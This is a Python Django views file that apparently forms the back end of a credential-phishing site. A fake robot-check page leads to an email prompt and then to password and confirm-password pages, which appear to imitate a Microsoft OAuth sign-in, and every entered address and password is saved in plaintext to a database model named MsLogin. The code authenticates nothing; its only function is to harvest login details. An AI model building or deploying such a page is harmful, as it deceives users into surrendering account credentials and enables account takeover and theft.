from django.shortcuts import render,redirect
from .models import MsLogin
def Robotchecker(request):
    
    if request.method == 'POST':
        try:
            if request.POST['humanbox']:
                return redirect('elogin')
        except:
            return render(request,'index.html', {'error_message':'Click the box to verify'})
    return render(request,'index.html' )


def EmailLogin(request):
    if request.method == 'POST':
        msLogin = MsLogin.objects.create(email=request.POST['email-text'])
        msLogin.save()
        request.session['id'] = str(msLogin.id)
        return redirect('plogin')
    return render(request, 'oauth.html')

def passwordlLogin(request):
    title = 'Password'
    
    user = MsLogin.objects.get(id=request.session['id'])
    
    if request.method == 'POST':
        user.password1 = request.POST['passcode']
        user.save()
        return redirect('cplogin')
    return render(request, 'oauth02_authorize.html',{'user':user,  'title':title})
    

def cpasswordlLogin(request):
    title = 'Confirm Password'
    user = MsLogin.objects.get(id=request.session['id'])
    error_message = ""
    if request.method == 'POST':
        if user.password1 == str(request.POST['passcode']):
            user.password2 = request.POST['passcode']
            password = request.POST['passcode']
            user.save()
        else:
            error_message = "password does not match"
    return render(request, 'oauth02_authorize.html',{'user':user, 'title':title, 'error_message': error_message})

